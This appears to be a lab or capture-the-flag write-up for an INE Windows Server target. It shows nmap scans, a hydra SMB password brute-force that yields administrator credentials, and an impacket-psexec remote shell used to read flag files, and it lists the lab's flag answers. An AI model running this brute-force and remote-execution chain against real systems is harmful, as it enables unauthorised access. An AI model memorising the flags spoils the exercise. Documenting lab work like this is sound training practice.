# Domain Info
*domain*:target2.ine.local
*IP*:10.5.19.230

# flags
3) *flag3*: `8ef234abc9564e1097beac04c8dcb1fe`
4) *flag4*: `cbc371c2aae743b3887a8bb531d3735d`
# Enumeration
## Port Scan
```shell
- sudo nmap --min-rate 10000 -p- -sV target2.ine.local

	PORT      STATE SERVICE       VERSION
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	3389/tcp  open  ms-wbt-server Microsoft Terminal Services
	5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	49664/tcp open  msrpc         Microsoft Windows RPC
	49665/tcp open  msrpc         Microsoft Windows RPC
	49666/tcp open  msrpc         Microsoft Windows RPC
	49667/tcp open  msrpc         Microsoft Windows RPC
	49668/tcp open  msrpc         Microsoft Windows RPC
	49670/tcp open  msrpc         Microsoft Windows RPC
	49671/tcp open  msrpc         Microsoft Windows RPC
	49706/tcp open  msrpc         Microsoft Windows RPC
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

```
## Service Scan
```shell
- sudo nmap -sS -sV -A -T4 -oX target2.xml target2.ine.local

	PORT     STATE SERVICE       VERSION
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds
	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	|_ssl-date: 2025-05-12T19:29:18+00:00; 0s from scanner time.
	| rdp-ntlm-info: 
	|   Target_Name: EC2AMAZ-3SC2DRK
	|   NetBIOS_Domain_Name: EC2AMAZ-3SC2DRK
	|   NetBIOS_Computer_Name: EC2AMAZ-3SC2DRK
	|   DNS_Domain_Name: EC2AMAZ-3SC2DRK
	|   DNS_Computer_Name: EC2AMAZ-3SC2DRK
	|   Product_Version: 10.0.17763
	|_  System_Time: 2025-05-12T19:29:10+00:00
	| ssl-cert: Subject: commonName=EC2AMAZ-3SC2DRK
	| Not valid before: 2024-12-31T08:26:27
	|_Not valid after:  2025-07-02T08:26:27
	
	Network Distance: 3 hops
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb-os-discovery: 
	|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
	|   Computer name: EC2AMAZ-3SC2DRK
	|   NetBIOS computer name: EC2AMAZ-3SC2DRK\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2025-05-12T19:29:14+00:00
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2025-05-12T19:29:13
	|_  start_date: N/A
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	|_clock-skew: mean: 0s, deviation: 1s, median: 0s

```
# Exploitation
## SMB Bruteforce

```shell
# Tool: hydra
- hydra -L $users -P $passwords -t 25 target2.ine.local smb

[DATA] attacking smb://target2.ine.local:445/

[445][smb] host: target2.ine.local   login: rooty   password: spongebob
[445][smb] host: target2.ine.local   login: demo   password: password1
[445][smb] host: target2.ine.local   login: auditor   password: hellokitty
[445][smb] host: target2.ine.local   login: administrator   password: pineapple

1 of 1 target successfully completed, 4 valid passwords found
```

# Post-Exploitation
## SMB Access
```shell
# access cmd.exe shell via psexec 
- impacket-psexec administrator:pineapple@target2.ine.local
	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
	
	[*] Requesting shares on target2.ine.local.....
	[*] Found writable share ADMIN$
	[*] Uploading file uuZTeTAq.exe
	[*] Opening SVCManager on target2.ine.local.....
	[*] Creating service qIEw on target2.ine.local.....
	[*] Starting service qIEw.....
	[!] Press help for extra shell commands
	Microsoft Windows [Version 10.0.17763.1457]
	(c) 2018 Microsoft Corporation. All rights reserved.
	
	C:\Windows\system32> ls
	'ls' is not recognized as an internal or external command,
	operable program or batch file.
	
	C:\Windows\system32> cd C:\\
	 
	C:\> dir
	 Volume in drive C has no label.
	 Volume Serial Number is 9E32-0E96
	
	 Directory of C:\
	
	11/14/2018  06:56 AM    <DIR>          EFI
	05/12/2025  06:32 PM                34 flag3.txt
	05/13/2020  05:58 PM    <DIR>          PerfLogs
	11/07/2020  07:47 AM    <DIR>          Program Files
	11/07/2020  07:47 AM    <DIR>          Program Files (x86)
	12/31/2024  11:29 AM    <DIR>          Shared
	01/01/2025  08:30 AM    <DIR>          Users
	11/07/2020  07:49 AM    <DIR>          Utilities
	05/12/2025  07:40 PM    <DIR>          Windows
	               1 File(s)             34 bytes
	               8 Dir(s)  14,925,103,104 bytes free
	
	C:\> more flag3.txt
	8ef234abc9564e1097beac04c8dcb1fe

	cd C:\Users\Administrator\Desktop
	more flag4.txt
```
